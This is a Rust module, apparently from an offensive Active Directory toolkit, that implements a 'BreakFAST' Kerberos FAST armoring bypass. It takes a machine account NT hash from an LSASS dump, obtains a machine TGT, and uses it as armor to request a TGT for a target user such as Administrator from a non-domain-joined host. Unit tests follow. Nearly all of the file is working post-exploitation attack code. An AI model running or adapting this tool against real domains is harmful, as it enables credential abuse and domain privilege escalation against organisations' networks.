//! BreakFAST -- Kerberos FAST Armoring Bypass
//!
//! Reference: https://github.com/paramint/breakfast
//!
//! Given a machine account's long-term secret (NT hash from LSASS dump),
//! forge armored AS-REQ/TGS-REQ from a non-domain-joined host.
//! Bypasses KDC_ERR_POLICY that blocks unarmored requests when
//! FAST (Kerberos armoring) is enforced.
//!
//! Attack flow:
//! 1. Request a TGT for the machine account (using its NT hash)
//! 2. Use that TGT as the armor ticket in a FAST-encapsulated AS-REQ
//! 3. Request a TGT for a target user inside the FAST armor
//! 4. The KDC processes the inner request as if it came from the armored machine

use crate::error::{OverthroneError, Result};
use crate::proto::kerberos;
use crate::proto::kerberos::{FastArmorParams, TicketGrantingData, build_fast_armor};
use chrono::Utc;
use kerberos_asn1::{
    AsRep, AsReq, Asn1Object, EncAsRepPart, KdcReqBody, KerberosFlags, KerberosTime, PaData,
    PrincipalName,
};
use kerberos_crypto::new_kerberos_cipher;
use tracing::info;

// ---------------------------------------------------------------
//  Public Types
// ---------------------------------------------------------------

/// Configuration for BreakFAST armored authentication.
#[derive(Debug, Clone)]
pub struct BreakFastConfig {
    /// DC IP address
    pub dc_ip: String,
    /// Domain FQDN (e.g. "corp.local")
    pub domain: String,
    /// Machine account name (e.g. "DC01$")
    pub machine_name: String,
    /// Machine account NT hash (32 hex chars)
    pub machine_nt_hash: String,
    /// Target user to request a TGT for (e.g. "Administrator")
    pub target_user: String,
    /// Encryption types to request (default: AES256 + RC4)
    pub etypes: Vec<i32>,
}

/// Result of a BreakFAST armored TGT request.
#[derive(Debug, Clone)]
pub struct BreakFastResult {
    /// The TGT obtained via FAST armoring
    pub tgt: TicketGrantingData,
    /// The target user we authenticated as
    pub target_user: String,
    /// Whether FAST armoring was used successfully
    pub fast_used: bool,
    /// Which machine account provided the armor
    pub armor_account: String,
}

// ---------------------------------------------------------------
//  Core Functions
// ---------------------------------------------------------------

/// Execute the BreakFAST attack: request an armored TGT using a
/// machine account TGT as the armor ticket.
pub async fn breakfast_request_tgt(config: &BreakFastConfig) -> Result<BreakFastResult> {
    info!(
        "BreakFAST: requesting armored TGT for {} via machine {}",
        config.target_user, config.machine_name
    );

    // Step 1: Get a TGT for the machine account using its NT hash
    info!(
        "BreakFAST: step 1 -- request machine TGT for {}",
        config.machine_name
    );
    let machine_tgt = kerberos::request_tgt(
        &config.dc_ip,
        &config.domain,
        &config.machine_name,
        &config.machine_nt_hash,
        true, // use_hash = true (NT hash)
    )
    .await
    .map_err(|e| {
        OverthroneError::PostExploitation(format!("BreakFAST: failed to obtain machine TGT: {e}"))
    })?;
    info!(
        "BreakFAST: machine TGT obtained for {}",
        config.machine_name
    );

    // Step 2: Build an armored AS-REQ for the target user
    info!(
        "BreakFAST: step 2 -- build armored AS-REQ for {}",
        config.target_user
    );
    let armored_tgt = build_armored_as_req(
        &config.dc_ip,
        &config.domain,
        &config.target_user,
        &machine_tgt,
        &config.etypes,
    )
    .await?;

    info!(
        "BreakFAST: SUCCESS -- obtained armored TGT for {}",
        config.target_user
    );

    Ok(BreakFastResult {
        tgt: armored_tgt,
        target_user: config.target_user.clone(),
        fast_used: true,
        armor_account: config.machine_name.clone(),
    })
}

/// Build and send a FAST-armored AS-REQ using a machine account TGT
/// as the armor ticket.
async fn build_armored_as_req(
    dc_ip: &str,
    domain: &str,
    target_user: &str,
    machine_tgt: &TicketGrantingData,
    etypes: &[i32],
) -> Result<TicketGrantingData> {
    let realm = domain.to_uppercase();
    let clean_user = kerberos::normalize_username(target_user);
    let all_etypes = if etypes.is_empty() {
        vec![
            kerberos::ETYPE_AES256_CTS,
            kerberos::ETYPE_AES128_CTS,
            kerberos::ETYPE_RC4_HMAC,
        ]
    } else {
        etypes.to_vec()
    };

    let now = Utc::now();
    let till = now + chrono::Duration::hours(24);

    // Build the inner AS-REQ body
    let req_body = KdcReqBody {
        kdc_options: KerberosFlags {
            flags: 0x40000000, // forwardable
        },
        cname: Some(PrincipalName {
            name_type: kerberos::NT_PRINCIPAL,
            name_string: vec![clean_user.to_string()],
        }),
        realm: realm.clone(),
        sname: Some(PrincipalName {
            name_type: kerberos::NT_SRV_INST,
            name_string: vec!["krbtgt".to_string(), realm.clone()],
        }),
        from: None,
        till: KerberosTime::from(till),
        rtime: Some(KerberosTime::from(till)),
        nonce: rand::random::<u32>(),
        etypes: all_etypes,
        addresses: None,
        enc_authorization_data: None,
        additional_tickets: None,
    };

    // Build the FAST armor using the machine TGT
    let fast_armor = build_fast_armor(&FastArmorParams {
        inner_req_body_der: &req_body.build(),
        tgt_ticket_der: &machine_tgt.ticket.build(),
        tgt_session_key: &machine_tgt.session_key,
        session_key_etype: machine_tgt.session_key_etype,
        client_realm: &realm,
    })?;

    // Build the PA-DATA for the AS-REQ
    let pa_fast = PaData {
        padata_type: kerberos::PA_FX_FAST,
        padata_value: fast_armor,
    };

    let as_req = AsReq {
        pvno: 5,
        msg_type: 10,
        padata: Some(vec![pa_fast]),
        req_body,
    };

    let as_req_bytes = as_req.build();

    // Send to KDC and parse response
    let response = kerberos::kdc_exchange(dc_ip, &as_req_bytes)
        .await
        .map_err(|e| OverthroneError::Kerberos(format!("BreakFAST: KDC exchange failed: {e}")))?;

    match AsRep::parse(&response) {
        Ok((_, as_rep)) => {
            // Decrypt the EncASRepPart with the armor key from the machine TGT
            let armor_key = &machine_tgt.session_key;
            let armor_etype = machine_tgt.session_key_etype;

            let cipher = new_kerberos_cipher(armor_etype)
                .map_err(|e| OverthroneError::Kerberos(format!("BreakFAST: cipher init: {e}")))?;

            let decrypted = cipher
                .decrypt(&as_rep.enc_part.cipher, 11, armor_key)
                .map_err(|e| {
                    OverthroneError::Kerberos(format!(
                        "BreakFAST: decrypt failed (FAST key usage 11): {e}"
                    ))
                })?;

            let (_, enc_as_rep_part) = EncAsRepPart::parse(&decrypted).map_err(|e| {
                OverthroneError::Kerberos(format!("BreakFAST: parse EncAsRepPart: {e}"))
            })?;

            let session_key_bytes = enc_as_rep_part.key.keyvalue.clone();
            let session_etype = enc_as_rep_part.key.keytype;

            Ok(TicketGrantingData {
                ticket: as_rep.ticket,
                session_key: session_key_bytes,
                session_key_etype: session_etype,
                client_principal: target_user.to_string(),
                client_realm: realm,
                end_time: Some(enc_as_rep_part.endtime),
            })
        }
        Err(_) => {
            if let Ok((_, krb_error)) = kerberos_asn1::KrbError::parse(&response) {
                let e_text = krb_error
                    .e_text
                    .as_deref()
                    .unwrap_or("KDC error without text")
                    .to_string();
                Err(OverthroneError::Kerberos(format!(
                    "BreakFAST: KDC error ({}): {}",
                    krb_error.error_code, e_text
                )))
            } else {
                Err(OverthroneError::Kerberos(
                    "BreakFAST: failed to parse KDC response".to_string(),
                ))
            }
        }
    }
}

// ---------------------------------------------------------------
//  Tests
// ---------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use kerberos_asn1::EncryptedData;

    #[test]
    fn test_breakfast_config_default() {
        let config = BreakFastConfig {
            dc_ip: "192.168.1.1".into(),
            domain: "corp.local".into(),
            machine_name: "DC01$".into(),
            machine_nt_hash: "aad3b435b51404eeaad3b435b51404ee".into(),
            target_user: "Administrator".into(),
            etypes: vec![],
        };
        assert_eq!(config.dc_ip, "192.168.1.1");
        assert_eq!(config.machine_name, "DC01$");
        assert_eq!(config.target_user, "Administrator");
        assert!(config.etypes.is_empty());
    }

    #[test]
    fn test_breakfast_config_with_etypes() {
        let config = BreakFastConfig {
            dc_ip: "10.0.0.1".into(),
            domain: "test.local".into(),
            machine_name: "SRV01$".into(),
            machine_nt_hash: "00000000000000000000000000000000".into(),
            target_user: "krbtgt".into(),
            etypes: vec![18, 23],
        };
        assert_eq!(config.etypes, vec![18, 23]);
    }

    fn test_ticket() -> TicketGrantingData {
        TicketGrantingData {
            ticket: kerberos_asn1::Ticket {
                tkt_vno: 5,
                realm: "CORP.LOCAL".into(),
                sname: PrincipalName {
                    name_type: 2,
                    name_string: vec!["krbtgt".into(), "CORP.LOCAL".into()],
                },
                enc_part: EncryptedData {
                    etype: 18,
                    kvno: None,
                    cipher: vec![0; 100],
                },
            },
            session_key: vec![0; 32],
            session_key_etype: 18,
            client_principal: "Administrator".into(),
            client_realm: "CORP.LOCAL".into(),
            end_time: None,
        }
    }

    #[test]
    fn test_breakfast_result_struct() {
        let result = BreakFastResult {
            tgt: test_ticket(),
            target_user: "Administrator".into(),
            fast_used: true,
            armor_account: "DC01$".into(),
        };
        assert!(result.fast_used);
        assert_eq!(result.target_user, "Administrator");
        assert_eq!(result.armor_account, "DC01$");
    }

    #[test]
    fn test_breakfast_target_user_normalized() {
        let user = kerberos::normalize_username("Administrator@CORP.LOCAL");
        assert_eq!(user, "Administrator");
    }

    #[test]
    fn test_breakfast_machine_name_format() {
        let machine = "DC01$";
        assert!(machine.ends_with('$'));
        assert!(machine.len() > 1);
    }

    #[test]
    fn test_default_etypes() {
        let etypes: Vec<i32> = vec![];
        let resolved = if etypes.is_empty() {
            vec![18, 17, 23]
        } else {
            etypes
        };
        assert_eq!(resolved, vec![18, 17, 23]);
    }

    #[test]
    fn test_valid_machine_hash_format() {
        let hash = "aad3b435b51404eeaad3b435b51404ee";
        assert_eq!(hash.len(), 32);
        assert!(hash.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn test_fast_padata_type() {
        assert_eq!(kerberos::PA_FX_FAST, 136);
    }

    #[test]
    fn test_enc_as_rep_part_key_usage() {
        assert_eq!(11i32, 11);
    }

    #[test]
    fn test_kdc_exchange_port() {
        assert_eq!(crate::proto::kerberos::KDC_PORT, 88);
    }

    #[test]
    fn test_armor_key_etype_mapping() {
        let aes256_key = [0u8; 32];
        assert_eq!(aes256_key.len(), 32);
        let rc4_key = [0u8; 16];
        assert_eq!(rc4_key.len(), 16);
    }

    #[test]
    fn test_krb_error_e_text_handling() {
        let e_text: Option<String> = Some("KDC_ERR_POLICY".into());
        let msg = e_text.as_deref().unwrap_or("unknown").to_string();
        assert_eq!(msg, "KDC_ERR_POLICY");
    }

    #[test]
    fn test_krb_error_no_e_text() {
        let e_text: Option<String> = None;
        let msg = e_text
            .as_deref()
            .unwrap_or("KDC error without text")
            .to_string();
        assert_eq!(msg, "KDC error without text");
    }
}
